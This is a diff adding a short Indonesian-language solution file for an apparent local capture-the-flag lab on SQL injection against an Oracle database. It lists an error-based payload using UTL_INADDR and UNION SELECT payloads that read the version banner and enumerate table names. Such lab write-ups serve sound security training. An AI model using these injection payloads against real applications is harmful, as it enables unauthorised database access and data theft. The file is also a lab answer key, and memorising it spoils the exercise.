@@ -1,0 +1,13 @@
+# Solusi Lab: Oracle Version Lab (Port 5005)
+
+## Cara Mendapatkan Flag:
+
+1. Akses aplikasi di http://localhost:5005
+2. Identifikasi bahwa aplikasi menggunakan database Oracle
+3. Gunakan payload khusus Oracle untuk SQL injection
+4. Contoh payload untuk mendapatkan versi Oracle:
+   - Parameter: id=1 AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))
+5. Gunakan Oracle-specific queries untuk enumerasi:
+   - UNION SELECT banner FROM v$version WHERE rownum=1--
+   - UNION SELECT table_name FROM user_tables WHERE rownum=1--
+6. Cari flag di tabel-tabel Oracle yang relevan
